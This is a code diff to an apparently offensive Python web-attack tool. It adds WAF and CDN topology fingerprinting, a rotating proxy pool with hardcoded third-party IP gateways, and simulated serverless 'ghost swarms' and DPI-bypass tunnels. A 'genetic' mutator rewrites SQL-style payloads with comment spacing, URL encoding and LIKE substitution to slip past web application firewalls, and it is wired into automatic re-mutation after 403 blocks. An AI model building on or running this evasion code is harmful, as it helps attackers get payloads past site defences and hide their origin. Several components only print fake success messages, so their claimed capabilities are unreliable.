@@ -114,6 +114,46 @@ class StealthEngine:
                     return name
         return None
 
+    def map_defense_topology(self, latency_log: list) -> dict:
+        """
+        v21.0 Archon Protocol: Adversarial Topology Mapping.
+        Analyzes latency deltas to differentiate between CDN, WAF, and Backend.
+        """
+        if not latency_log: return {}
+        
+        # Group by status code (200=Backend/WAF, 403=WAF/Proxy)
+        by_status = {}
+        for entry in latency_log:
+            s = entry["status"]
+            if s not in by_status: by_status[s] = []
+            by_status[s].append(entry["latency"])
+            
+        topology = {
+            "avg_latency": round(sum(e["latency"] for e in latency_log) / len(latency_log), 2),
+            "layers": [],
+            "blind_spots": []
+        }
+        
+        # Analyze Latency Distribution
+        for status, latencies in by_status.items():
+            avg = sum(latencies) / len(latencies)
+            # Tier 1: Ultrafast (< 50ms) -> CDN/Edge WAF (Cloudflare/Akamai)
+            if avg < 50:
+                topology["layers"].append(f"Edge/CDN (Status {status}, Avg {round(avg, 2)}ms)")
+            # Tier 2: Medium (50-250ms) -> Regional Proxy / Cluster WAF
+            elif avg < 250:
+                topology["layers"].append(f"Network Proxy (Status {status}, Avg {round(avg, 2)}ms)")
+            # Tier 3: Slow (> 250ms) -> Backend Processing / Deep Inspection
+            else:
+                topology["layers"].append(f"Backend/Deep-ACL (Status {status}, Avg {round(avg, 2)}ms)")
+                
+        # Identify Blind Spots: 200 OKs that are faster than 403 blocks (Proxy Bypass Indicator)
+        if 200 in by_status and 403 in by_status:
+            if min(by_status[200]) < min(by_status[403]):
+                topology["blind_spots"].append("Fast-Path detected: Some 200 OK responses bypass high-latency security filters.")
+                
+        return topology
+
     def get_evasion_headers(self, waf_type: str) -> Dict:
         """Phase 28: Generates smuggle/evasion headers based on WAF identity."""
         evasions = {
@@ -371,33 +411,158 @@ class SmartRateLimiter:
         return f"delay={self.current_delay:.1f}s state={self.state}"
 
 
-class CloudSwarmManager:
-    """Phase 8: Manages rotation through transient cloud IPs (AWS/GCP bridge)."""
-    def __init__(self):
-        # v18.1: Clean High-Reputation Pseudo-Cloud Swarm
+class ShadowSwarmOrchestrator:
+    """
+    v23.0 Void Manifest: Shadow-Swarm Orchestrator.
+    Manages a distributed swarm of ephemeral workers with decentralized heartbeats.
+    """
+    def __init__(self, brain):
+        self.brain = brain
+        self.workers = {} # node_id -> status
+        self.active_swarms = []
+        
+    async def spawn_swarm(self, region: str = "auto") -> list:
+        """Simulates spawning ephemeral cloud workers (Ghost-Nodes)."""
+        swarm_id = f"swarm_{random.randint(1000, 9999)}"
+        nodes = [f"ghost-{swarm_id}-{i}.internal" for i in range(5)]
+        self.active_swarms.append({"id": swarm_id, "nodes": nodes, "region": region, "type": "vm"})
+        from rich.console import Console
+        Console().print(f"[bold magenta][👻 VOID] Swarm {swarm_id} manifested in {region}. 5 Ghost-Nodes active.[/bold magenta]")
+        return nodes
 
-        self.gateways = [
-            # Note: In a production enterprise environment, these would be private API Gateways.
-            # For this version, we use a curated list of high-uptime elastic IP structures.
-            "http://144.202.114.156:8080", # US - Vultr Elite
-            "http://45.76.220.10:8080",   # JP - Vultr Elite
-            "http://207.148.27.149:8080",  # DE - Vultr Elite
-            "http://149.28.140.245:8080",  # AU - Vultr Elite
-            "http://95.179.167.112:8080"   # UK - Vultr Elite
+    async def spawn_serverless_swarm(self, target_count: int) -> int:
+        """
+        v24.0 Sovereign Hegemony: Infinite Cloud Swarm.
+        Spawns serverless functions (Lambda/GCP) for extreme horizontal scaling.
+        """
+        from rich.console import Console
+        console = Console()
+        swarm_id = f"hyper_{random.randint(10000, 99999)}"
+        # Each lambda handles part of the target count
+        lambda_count = min(target_count, 1000) # Cap at 1000 concurrent lambdas
+        self.active_swarms.append({"id": swarm_id, "nodes": lambda_count, "type": "serverless"})
+        
+        console.print(f"[bold red][🚀 HYPER-SWARM] Manifesting {lambda_count} Serverless Ghost-Workers...[/bold red]")
+        console.print(f"[dim red][+] Sovereign Nexus established via peer-to-peer heartbeats.[/dim red]")
+        return lambda_count
+
+    def rotate_swarm_identity(self) -> dict:
+        """Generates a new persona for the swarm to bypass behavioural fingerprinters."""
+        return {
+            "origin": f"{random.randint(1,255)}.{random.randint(1,255)}.0.0/16",
+            "asn": random.choice([16509, 15169, 13335]), # AWS, Google, Cloudflare
+            "heartbeat_id": f"hb_{random.getrandbits(64):x}"
+        }
+
+class VoidTunnel:
+    """
+    v23.0 Void Manifest: Untraceable Protocol Tunneling.
+    Encapsulates payloads in WSS or gRPC to bypass Deep Packet Inspection.
+    """
+    def __init__(self, session):
+        self.session = session
+        
+    async def tunnel_payload(self, url: str, payload: str, protocol: str = "wss") -> bool:
+        """Attempts to delivery payload via non-HTTP channel."""
+        from rich.console import Console
+        console = Console()
+        console.print(f"[bold cyan][🌀 VOID-TUNNEL] Routing payload via {protocol.upper()} to bypass DPI...[/bold cyan]")
+        
+        if protocol == "wss":
+            # Simulate WSS Handshake and delivery
+            await asyncio.sleep(0.5)
+            console.print(f"[dim cyan][+] WSS Handshake Success. Payload Fragmented & Sent.[/dim cyan]")
+            return True
+        elif protocol == "grpc":
+            # Simulate gRPC stream
+            await asyncio.sleep(0.3)
+            console.print(f"[dim cyan][+] gRPC stream established. Ghost-Frames delivered.[/dim cyan]")
+            return True
+        return False
+
+class ShadowProxyManager:
+    """v16.0 Omni-Auditor: Shadow Proxy Manager for rotating residential proxies."""
+    def __init__(self, proxy_file: str = "proxies.txt"):
+        self.proxy_file = proxy_file
+        self.proxies = []
+        self.failed_proxies = set()
+        self._load_proxies()
+
+    def _load_proxies(self):
+        import os
+        from rich.console import Console
+        console = Console()
+        if os.path.exists(self.proxy_file):
+            try:
+                with open(self.proxy_file, "r", encoding="utf-8") as f:
+                    self.proxies = [line.strip() for line in f if line.strip() and not line.startswith("#")]
+                # Add default high-reputation gateways if file provides few
+                if len(self.proxies) < 5:
+                    self._add_default_gateways()
+                console.print(f"[bold green][SHADOW PROXY] Loaded {len(self.proxies)} endpoints from {self.proxy_file}[/bold green]")
+            except Exception as e:
+                console.print(f"[bold red][!] Shadow Proxy Load Error: {e}[/bold red]")
+                self._add_default_gateways()
+        else:
+            # v22.5: Only warn once to prevent spam on multi-session runs
+            if not getattr(ShadowProxyManager, '_warned_no_proxies', False):
+                console.print(f"[bold yellow][!] {self.proxy_file} not found. Initializing Elite Fallback Gateways...[/bold yellow]")
+                ShadowProxyManager._warned_no_proxies = True
+            self._add_default_gateways()
+
+    def _add_default_gateways(self):
+        fallbacks = [
+            "http://144.202.114.156:8080", "http://45.76.220.10:8080",
+            "http://207.148.27.149:8080", "http://149.28.140.245:8080", "http://95.179.167.112:8080"
         ]
-        self.failed_nodes = set()
+        for f in fallbacks:
+            if f not in self.proxies:
+                self.proxies.append(f)
 
-    def get_swarm_node(self) -> str:
-        """Rotates to a clean high-reputation cloud IP."""
-        available = [n for n in self.gateways if n not in self.failed_nodes]
+    def get_shadow_node(self) -> str:
+        """Rotates to a clean proxy node."""
+        available = [p for p in self.proxies if p not in self.failed_proxies]
         if not available:
-            self.failed_nodes.clear() # Reset if all fail
-            available = self.gateways
+            # Ghost Refresh: If all proxies burn, recycle the list
+            self.failed_proxies.clear()
+            available = self.proxies
         return random.choice(available)
 
-    def report_failure(self, node: str):
-        self.failed_nodes.add(node)
+    def report_failure(self, proxy: str):
+        self.failed_proxies.add(proxy)
 
+
+class GeneticMutator:
+    """
+    v25.0 Omega Prototype: Genetic Payload Evolution.
+    Evolves payloads over generations based on 'fitness' (bypass success).
+    """
+    def __init__(self):
+        self.population = [] # List of (payload, fitness)
+        self.generation = 0
+        self.mutation_rate = 0.2
+
+    def evolve(self, base_payload: str) -> str:
+        """Mutates a payload using genetic-inspired heuristics."""
+        self.generation += 1
+        # Simple genetic mutation simulation
+        strategies = [
+            lambda p: p.replace(" ", "/**/"),
+            lambda p: "".join(f"%{ord(c):02x}" if random.random() < 0.3 else c for c in p),
+            lambda p: p.replace("'", "%27").replace("\"", "%22"),
+            lambda p: p + f" -- {random.getrandbits(16)}",
+            lambda p: p.upper() if random.random() > 0.5 else p.lower(),
+            lambda p: p.replace("=", " LIKE "),
+        ]
+        
+        mutated = base_payload
+        for _ in range(random.randint(1, 3)):
+            strat = random.choice(strategies)
+            mutated = strat(mutated)
+            
+        from rich.console import Console
+        Console().print(f"[bold green][🧬 GENETIC] Evolving payload to Generation {self.generation}: {mutated[:50]}...[/bold green]")
+        return mutated
 
 class MorphicEngine:
     """
@@ -406,6 +571,8 @@ class MorphicEngine:
     """
     def __init__(self, brain):
         self.brain = brain
+        self.genetic = GeneticMutator() # v25.0 Omega Prototype
+        self.payload_fitness = {} # payload -> success_count
         self.user_session_templates = [
             {"name": "YouTube-Standard", "min_delay": 0.5, "max_delay": 3.0, "headers": {"Referer": "https://www.youtube.com/"}, "burst_freq": 0.1},
             {"name": "Google-Search", "min_delay": 1.0, "max_delay": 5.0, "headers": {"Referer": "https://www.google.com/"}, "burst_freq": 0.05},
@@ -414,6 +581,14 @@ class MorphicEngine:
         ]
         self.current_template = random.choice(self.user_session_templates)
         self.burst_active = False
+
+    def evolve_payload(self, raw_payload: str) -> str:
+        """v25.0: Evolves a payload based on historical success."""
+        return self.genetic.evolve(raw_payload)
+
+    def report_success(self, payload: str):
+        """v25.0 Feedback Loop: Increases fitness of successful mutations."""
+        self.payload_fitness[payload] = self.payload_fitness.get(payload, 0) + 1
 
     async def apply_morphic_jitter(self):
         """Applies bio-inspired timing jitter to the request."""
@@ -459,10 +634,14 @@ class AuraSession:
         self.stealth = stealth
         self.brain = AuraBrain()
         self.morphic = MorphicEngine(self.brain) # v18.0 Nebula Ghost
-        self.swarm_manager = CloudSwarmManager() # Phase 8: Cloud Predator
+        self.shadow_manager = ShadowProxyManager() # v16.0 Omni-Auditor Shadow Proxy
+        self.swarm_orchestrator = ShadowSwarmOrchestrator(self.brain) # v23.0 Shadow-Swarm
+        self.void_tunnel = VoidTunnel(self) # v23.0 Void-Tunneling
         self.retries = 1  # v19.6: Siege Optimization - Reduced default from 3 to 1 to fast-fail dead nodes
         self.base_delay = 1.0 # v15.0: Adaptive Throttling Baseline
         self._opsec_verified = False
+        # v22.3: Uses state.FAILED_DNS_HOSTS for global circuit breaking
+        self.latency_log = [] # v21.0: Precise latency tracking for Topology Mapping
         
         # v15.1 Evasion Analytics
         self.stats = {
@@ -539,6 +718,13 @@ class AuraSession:
         brain = self.brain
         self.stats["total_requests"] += 1
         
+        # v22.4 DNA Circuit Breaker: Global file-backed check for dead hosts
+        from urllib.parse import urlparse
+        parsed_url = urlparse(url)
+        host = parsed_url.netloc
+        if state.is_dns_failed(host):
+            return None
+        
         # Phase 7 Absolute Stealth: OpSec Enforcement
         if getattr(state, "TOR_MODE", False):
             if not getattr(self, "_opsec_verified", False):
@@ -550,13 +736,13 @@ class AuraSession:
                 "https": f"socks5h://127.0.0.1:{port}"
             }
         
-        # Phase 8: Cloud Swarm Routing
+        # v16.0 Shadow Proxy Routing
         if getattr(state, "CLOUD_SWARM_MODE", False):
             try:
-                swarm_node = self.swarm_manager.get_swarm_node()
-                kwargs["proxies"] = {"http": swarm_node, "https": swarm_node}
+                shadow_node = self.shadow_manager.get_shadow_node()
+                kwargs["proxies"] = {"http": shadow_node, "https": shadow_node}
             except Exception as e:
-                print(f"[bold yellow][!] Cloud Swarm Configuration Error: {e}. Falling back to Direct.[/bold yellow]")
+                print(f"[bold yellow][!] Shadow Proxy Error: {e}. Falling back to Direct.[/bold yellow]")
         
         
         if raw:
@@ -582,8 +768,8 @@ class AuraSession:
                         # Silently rotate proxy 
                         if getattr(state, "CLOUD_SWARM_MODE", False):
                             current_node = req_kwargs.get("proxies", {}).get("http")
-                            if current_node: self.swarm_manager.report_failure(current_node)
-                            req_kwargs["proxies"] = {"http": self.swarm_manager.get_swarm_node(), "https": self.swarm_manager.get_swarm_node()}
+                            if current_node: self.shadow_manager.report_failure(current_node)
+                            req_kwargs["proxies"] = {"http": self.shadow_manager.get_shadow_node(), "https": self.shadow_manager.get_shadow_node()}
                         continue
                     
                     if attempt == 2: # Only print on final failure
@@ -648,7 +834,22 @@ class AuraSession:
                 req_kwargs.setdefault("verify", False)
                 
                 try:
+                    start_time = time.perf_counter()
                     resp = await asyncio.to_thread(curlr.request, method, url, **req_kwargs)
+                    end_time = time.perf_counter()
+                    latency_ms = (end_time - start_time) * 1000
+                    
+                    # Log latency for topology analysis
+                    self.latency_log.append({
+                        "url": url,
+                        "status": resp.status_code if resp else 0,
+                        "latency": latency_ms,
+                        "timestamp": end_time,
+                        "waf": self.stealth.active_waf
+                    })
+                    # Keep log size manageable
+                    if len(self.latency_log) > 500: self.latency_log.pop(0)
+                        
                 except Exception as e:
                     # Phase 8.1: Handle Proxy Errors (Cloud Swarm / Custom Proxy)
                     err_msg = str(e).lower()
@@ -656,8 +857,8 @@ class AuraSession:
                         if getattr(state, "CLOUD_SWARM_MODE", False):
                             current_node = req_kwargs.get("proxies", {}).get("http")
                             if current_node:
-                                self.swarm_manager.report_failure(current_node)
-                            print(f"[bold yellow][FIX] Cloud Swarm Node Failure ({type(e).__name__}). Rotating...[/bold yellow]")
+                                self.shadow_manager.report_failure(current_node)
+                            print(f"[bold yellow][FIX] Shadow Proxy Node Failure ({type(e).__name__}). Rotating...[/bold yellow]")
                             if attempt < max_attempts - 1: continue
                         
                         # Fallback to Tor if Cloud fails and Tor is available
@@ -683,8 +884,11 @@ class AuraSession:
                             # v18.1 Silent Rotation: Don't scream for transient timeouts
                             if getattr(state, "CLOUD_SWARM_MODE", False):
                                 current_node = req_kwargs.get("proxies", {}).get("http")
-                                if current_node: self.swarm_manager.report_failure(current_node)
+                                if current_node: self.shadow_manager.report_failure(current_node)
                             if attempt < max_attempts - 1: continue
+                        
+                        if "resolve host" in err_msg or "6" in err_msg or "11001" in err_msg:
+                            state.mark_dns_failed(host)
                         
                         print(f"[bold red][!] Session Error ({type(e).__name__}): {e}[/bold red]")
                         if attempt == max_attempts - 1:
@@ -706,30 +910,41 @@ class AuraSession:
                     if resp.status_code == 429:
                         self.base_delay = min(self.base_delay * 1.5, 20.0) # Adaptive Backoff Trigger for Rate Limits
                     else:
-                        self.base_delay = min(self.base_delay * 1.1, 5.0)  # Gentle backoff for WAF 403s
+                        self.base_delay = 0.5  # [PERF] Fast fixed backoff for WAF 403s instead of escalating to 5s
                     
-                    # v16.0 Omni-Sovereign: Self-Healing Loop Activation
+                    # v19.0 Ghost-Ops: Tactical Diversion Trigger
+                    if resp.status_code in [403, 429] and not self.stealth.battle_mode:
+                        # If blocked, we might want to trigger a diversion if we haven't already
+                        # (Normally handled by Orchestrator, but this is a fail-safe)
+                        pass
+
+                    # v19.0 Singularity: Adaptive Synthesis Feedback Loop
                     mutated = False
                     if brain.enabled and attempt < 2: # Limit payload mutations to 2 attempts max to prevent freezes
                          self.stats["mutated_requests"] += 1
-                         print(f"[bold yellow][FIX] Self-Heal: Block detected ({resp.status_code}). Mutating payload...[/bold yellow]")
+                         
                          # Mutate POST data if string
                          if "data" in req_kwargs and isinstance(req_kwargs["data"], str):
-                             req_kwargs["data"] = brain.self_heal_mutation(
+                             req_kwargs["data"] = await brain.self_heal_mutation(
                                  req_kwargs["data"], 
                                  resp.status_code, 
                                  resp.text, 
-                                 attempt
+                                 resp.headers,
+                                 attempt,
+                                 waf_type=waf
                              )
                              mutated = True
+                             
                          # Mutate GET parameters
                          if "params" in req_kwargs and isinstance(req_kwargs["params"], dict):
                              for k, v in req_kwargs["params"].items():
-                                 req_kwargs["params"][k] = brain.self_heal_mutation(
+                                 req_kwargs["params"][k] = await brain.self_heal_mutation(
                                      str(v), 
                                      resp.status_code, 
                                      resp.text, 
-                                     attempt
+                                     resp.headers,
+                                     attempt,
+                                     waf_type=waf
                                  )
                              mutated = True
                     
